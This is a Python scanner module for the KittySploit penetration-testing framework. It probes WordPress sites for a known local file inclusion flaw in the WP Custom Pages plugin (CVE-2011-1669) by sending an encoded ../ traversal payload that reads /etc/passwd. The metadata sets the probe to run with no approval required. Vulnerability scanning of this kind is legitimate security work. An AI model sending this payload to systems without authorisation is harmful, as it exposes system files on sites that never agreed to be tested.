#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in wp-download."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Custom Pages 0.5.0.1 - Local File Inclusion (LFI) Detection',
        'description': 'A directory traversal vulnerability in wp-download.php in the WP Custom Pages module 0.5.0.1 for WordPress allows remote attackers to read arbitrary files via ..%2F (encoded dot dot) sequences in the url parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'edb', 'wordpress', 'wp-plugin', 'lfi', 'mikoviny', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1669',
            'https://www.exploit-db.com/exploits/17119',
            'http://www.exploit-db.com/exploits/17119',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/66559',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2011-1669',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="WP Custom Pages 0.5.0.1 - Local File Inclusion (LFI) detected",
                path='/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            )
            return True
        return False

